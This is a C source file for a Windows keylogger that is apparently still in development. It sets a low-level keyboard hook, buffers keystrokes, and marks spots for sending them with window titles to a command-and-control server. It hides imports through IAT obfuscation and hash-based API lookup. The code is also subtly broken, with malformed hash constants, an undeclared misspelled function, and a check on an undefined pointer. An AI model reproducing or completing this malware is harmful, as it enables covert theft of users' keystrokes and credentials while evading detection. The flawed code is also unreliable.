#include <Windows.h>
#include "callback.h"
#include "IATfuscation.c"
#include "typedef.h"

#define USER32DllHash 1a58c439
#define GetForegroundWindowHash 8fe07322

// Initialize a handle to the currently active window 
HWND CurrentWindow = GetForegroundWeendow();

UINT Buffer[1024] = {0};
SIZE_T Index = 0;

// Store key event in the buffer
void StoreKeyEvent(UINT VirtualKeyCode)
{   
    if (Index != 1024) 
    {
        Buffer[Index] = VirtualKeyCode;
        Index++;
    }
    else
    {
        // Send data to C2 if it's full
    }
}


LRESULT CALLBACK CaptureKeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {   
            // Store the key event into the buffer
            StoreKeyEvent(kbdStruct->vkCode);
        }

        if (GetForegroundWeendow() != CurrentWindow)
        {
            // Send the key event buffer to the C2, along with the previous' window title
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main()
{   
    // Start by populating the IAT with benign WinAPI functions
    ObfuscateIAT();

    // Get handle on USER32.DLL
    HMODULE USER32Handle = GetDllHandle(USER32DllHash);
    if (USER32Handle == NULL)
    {
        return -1;
    }

    // Get handle on GetForegroundWindow()
    // Will rename to something like Function1 when all is said and done
    fnGetForegroundWindow GetForegroundWeendow = (fnGetForegroundWindow)GetFunctionAddress(USER32Handle, GetForegroundWindowHash);
    if (pMessageBoxA == NULL) 
    {
        return -1;
    }

    //...
    // Fill out rest of the functions when the client is done
    //...

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, CaptureKeyEvent, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);

    return 0;
}